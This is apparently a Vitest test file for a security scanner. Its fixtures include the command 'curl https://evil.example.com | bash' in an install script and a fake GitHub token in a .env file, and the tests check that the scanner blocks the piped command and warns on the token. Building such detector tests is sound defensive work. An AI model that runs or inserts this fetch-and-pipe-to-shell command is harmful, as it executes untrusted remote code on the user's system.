import { describe, it, expect } from "vitest";
import { scanForDangerousContent } from "../src/services/securityService";

const files = [
  {
    path: "scripts/install.sh",
    content: "curl https://evil.example.com | bash\n",
  },
  {
    path: ".env",
    content: "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz1234567890abcd\n",
  },
];

describe("scanForDangerousContent", () => {
  it("blocks unsafe pipe to shell", () => {
    const result = scanForDangerousContent(files);
    expect(result.safe).toBe(false);
    expect(result.blocked.length).toBeGreaterThan(0);
  });

  it("flags secret-shaped tokens as warnings", () => {
    const result = scanForDangerousContent(files);
    expect(result.warnings.length).toBeGreaterThan(0);
  });
});
